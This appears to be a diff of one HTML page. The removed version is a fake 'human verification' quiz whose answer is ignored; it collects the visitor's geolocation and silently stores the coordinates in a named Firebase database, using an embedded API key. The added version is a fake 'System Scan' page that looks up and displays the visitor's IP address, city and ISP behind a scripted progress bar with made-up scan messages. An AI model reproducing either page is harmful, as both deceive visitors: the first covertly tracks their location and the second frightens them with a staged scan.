@@ -1,90 +1,145 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Human Verification</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    button { padding: 10px 20px; font-size: 16px; }
-    input { padding: 8px; font-size: 16px; width: 200px; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Scan</title>
+
+<style>
+body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #0b0f1a;
+    color: #00ffcc;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    width: 90%;
+    max-width: 500px;
+    background: #111827;
+    padding: 25px;
+    border-radius: 12px;
+    box-shadow: 0 0 20px rgba(0,255,204,0.2);
+}
+
+h1 {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.scan-box {
+    background: #020617;
+    padding: 15px;
+    border-radius: 8px;
+    margin-top: 10px;
+}
+
+p {
+    margin: 6px 0;
+}
+
+.progress-bar {
+    width: 100%;
+    height: 8px;
+    background: #1f2937;
+    border-radius: 10px;
+    overflow: hidden;
+    margin-top: 15px;
+}
+
+.progress {
+    height: 100%;
+    width: 0%;
+    background: #00ffcc;
+    transition: width 0.3s;
+}
+
+.status {
+    margin-top: 10px;
+    font-size: 14px;
+    opacity: 0.8;
+}
+</style>
 </head>
+
 <body>
 
-<h2>Verify You Are Human</h2>
-<p>Answer the following question:</p>
+<div class="container">
+    <h1>System Scan</h1>
 
-<div id="quiz">
-  <p id="question"></p>
-  <input type="text" id="answer" placeholder="Type your answer">
-  <br><br>
-  <button onclick="submitAnswer()">Submit</button>
+    <div class="scan-box">
+        <p>IP Address: <span id="ip">Detecting...</span></p>
+        <p>Country: <span id="country">Detecting...</span></p>
+        <p>City: <span id="city">Detecting...</span></p>
+        <p>Region: <span id="region">Detecting...</span></p>
+        <p>ISP: <span id="org">Detecting...</span></p>
+        <p>Timezone: <span id="timezone">Detecting...</span></p>
+
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
+        </div>
+
+        <div class="status" id="status">Initializing scan...</div>
+    </div>
 </div>
 
-<p id="message"></p>
+<script>
+async function getIPInfo() {
+    try {
+        const response = await fetch("https://ipapi.co/json/");
+        const data = await response.json();
 
-<!-- Lightweight Firebase -->
-<script type="module">
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
-import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+        document.getElementById("ip").textContent = data.ip;
+        document.getElementById("country").textContent = data.country_name;
+        document.getElementById("city").textContent = data.city;
+        document.getElementById("region").textContent = data.region;
+        document.getElementById("org").textContent = data.org;
+        document.getElementById("timezone").textContent = data.timezone;
 
-// Firebase config
-const firebaseConfig = {
-  apiKey: "AIzaSyD-myAkBLFbPyqIomR02q6iftboysae-wQ",
-  authDomain: "locationxdd.firebaseapp.com",
-  databaseURL: "https://locationxdd-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "locationxdd",
-  storageBucket: "locationxdd.firebasestorage.app",
-  messagingSenderId: "114480292043",
-  appId: "1:114480292043:web:d143429c68784b0706bb4e"
-};
-
-const app = initializeApp(firebaseConfig);
-const db = getDatabase(app);
-
-// Capital quiz questions (random for show)
-const quizData = [
-  { country: "France", capital: "paris" },
-  { country: "Japan", capital: "tokyo" },
-  { country: "Australia", capital: "canberra" },
-  { country: "Brazil", capital: "brasilia" },
-  { country: "Canada", capital: "ottawa" }
-];
-
-const currentQuiz = quizData[Math.floor(Math.random() * quizData.length)];
-document.getElementById('question').innerText = `What is the capital of ${currentQuiz.country}?`;
-
-// Submit answer (location requested regardless of answer)
-function submitAnswer() {
-  document.getElementById('quiz').style.display = 'none';
-  document.getElementById('message').innerText = "Collecting your location...";
-  getLocation();
+    } catch (error) {
+        document.getElementById("status").textContent = "Failed to fetch IP data.";
+        console.error(error);
+    }
 }
 
-// Get location and send to Firebase
-function getLocation() {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendPosition, showError);
-  } else {
-    alert("Geolocation not supported by this browser.");
-  }
+function startFakeScan() {
+    const progress = document.getElementById("progress");
+    const status = document.getElementById("status");
+
+    let value = 0;
+    const messages = [
+        "Connecting to network...",
+        "Analyzing device...",
+        "Fetching IP details...",
+        "Scanning security layers...",
+        "Finalizing report..."
+    ];
+
+    let msgIndex = 0;
+
+    const interval = setInterval(() => {
+        value += Math.random() * 15;
+        progress.style.width = value + "%";
+
+        if (msgIndex < messages.length && value > (msgIndex + 1) * 20) {
+            status.textContent = messages[msgIndex];
+            msgIndex++;
+        }
+
+        if (value >= 100) {
+            progress.style.width = "100%";
+            status.textContent = "Scan complete.";
+            clearInterval(interval);
+        }
+    }, 600);
 }
 
-function sendPosition(position) {
-  push(ref(db, "locations"), {
-    latitude: position.coords.latitude,
-    longitude: position.coords.longitude,
-    time: new Date().toString(),
-    countryQuestion: currentQuiz.country,
-    userAnswer: document.getElementById('answer').value.trim()
-  });
-  document.getElementById('message').innerText = "Verification complete! Thank you.";
-}
-
-function showError(error) {
-  alert("Location permission denied or error occurred.");
-}
-
-window.submitAnswer = submitAnswer;
+getIPInfo();
+startFakeScan();
 </script>
 
 </body>
